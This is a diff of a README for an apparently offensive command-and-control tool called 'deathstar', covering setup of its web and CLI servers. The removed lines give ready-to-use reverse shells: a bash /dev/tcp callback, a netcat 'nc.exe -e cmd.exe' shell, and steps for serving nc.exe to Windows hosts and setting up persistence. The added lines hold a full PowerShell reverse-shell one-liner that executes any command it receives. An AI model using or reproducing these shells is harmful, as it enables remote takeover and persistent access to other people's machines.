@@ -7,84 +7,21 @@ Build and understand C2 infrastructure.
 
 `converter.sh` will convert `stardestroyer.py` into an EXE.
 
-# Web based C2
-![image](https://github.com/user-attachments/assets/e01272a6-1e5a-416c-8b56-45460317a349)
-
-# CLI based C2
-![image](https://github.com/user-attachments/assets/e574c863-f44f-47fb-ad8a-7c3148b247e2)
+# Deathstar web page
+<img width="991" alt="Screenshot 2024-12-21 at 12 46 55 AM" src="https://github.com/user-attachments/assets/6a6addfc-2875-47ff-bb39-ac332fa91f11" />
 
 # Download deathstar
 
 ```git clone github.com/bwithe/deathstar```
 
+
 # Web C2 server 
 1. Start the server
-    - `python3 deathstar-web.py`
+    - `python3 deathstar.py`
 2. Open link in web browser
-    - `firefox 127.0.0.1:5000`
+    - `firefox 127.0.0.1:8000`
 3. Have CLIENT connect to C2
     - Linux / MacOS
-      - BASH
-          - `bash -c "bash -i >& /dev/tcp/<C2-SERVER-IP>/9999 0>&1"`
-      - Python reverse shell
-          - This will continue to connect to the C2 server even after it 'drops'
-          - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
-          - `bash converter.sh stardestroyer.py`
-          - Copy `stardestoryer` to CLIENT
-          - `chmod +x stardestroyer`
-          - `./stardestroyer`
+      - `python3 client.py`
     - Windows
-        - NETCAT
-            - `C:\Windows\Temp\nc.exe -e cmd.exe $C2-IP 9999`
-        - If your C2 OS is Kali, you can host a python http.server with nc.exe and run `stardestroyer.ps1`
-            - On Kali
-                - `find / -name nc.exe 2>/dev/null`
-                - `sudo cp /usr/share/windows-resources/binaries/nc.exe .`
-                - `python3 -m http.server 80`
-            - On Windows
-                - Powershell.exe
-                - `.\stardestroyer.ps1`
-4. Start your listener 
-    - `nc -nvlp 4444`
-5. Forward the connection to your listener
-    - On the webpage, type the IP of the listening device, and select an OS from the drop down, then click forward.
-6. Catch the connection
-    - Once you've caught the connection, begin setting up persistence.
-7. Wash, rince, repeat.
-
-# CLI C2 server
-1. Start the server
-    - `python3 deathstar-term.py`
-2. Have CLIENT connect to C2
-    - Linux / MacOS
-      - BASH
-          - `bash -c "bash -i >& /dev/tcp/<C2-SERVER-IP>/9999 0>&1"`
-      - Python reverse shell
-          - This will continue to connect to the C2 server even after it 'drops'
-          - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
-          - `bash converter.sh stardestroyer.py`
-          - Copy `stardestoryer` to CLIENT
-          - `chmod +x stardestroyer`
-          - `./stardestroyer`
-    - Windows
-        - NETCAT
-            - `C:\Windows\Temp\nc.exe -e cmd.exe $C2-IP 9999`
-        - If your C2 OS is Kali, you can host a python http.server with nc.exe and run `stardestroyer.ps1`
-            - On Kali
-                - `find / -name nc.exe 2>/dev/null`
-                - `sudo cp /usr/share/windows-resources/binaries/nc.exe .`
-                - `python3 -m http.server 80`
-            - On Windows
-                - Powershell.exe
-                - `.\stardestroyer.ps1`
-3. Start your listener 
-    - `nc -nvlp 4444`
-4. Forward the connection to your listener
-    - On the CLI, list the connections.
-      - Select `2)` to forward.
-      - Specify the `ID` of the `CLIENT` you'd like to forward.
-      - Then, type the IP of your `LISTENING` device.
-5.Catch the connection
-    - Once you've caught the connection, begin setting up persistence.
-6. Wash, rince, repeat.
-
+        - `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('<DEATHSTAR_IP>',443);$s=$c.GetStream();$s.Write([byte[]](@(0x0A)),0,1);while($true){$b=[byte[]]::new(1024);$r=$s.Read($b,0,1024);$t=[text.encoding]::ASCII.GetString($b,0,$r).Trim();if($t -eq 'die'){exit};if($t -eq 'hostname'){$o=$env:COMPUTERNAME}elseif($t -eq 'whoami'){$o=$env:USERNAME}else{$o=iex $t 2>&1|Out-String};$o=$o.Trim()+[char]10;$d=[text.encoding]::ASCII.GetBytes($o);$s.Write($d,0,$d.Length)}"`
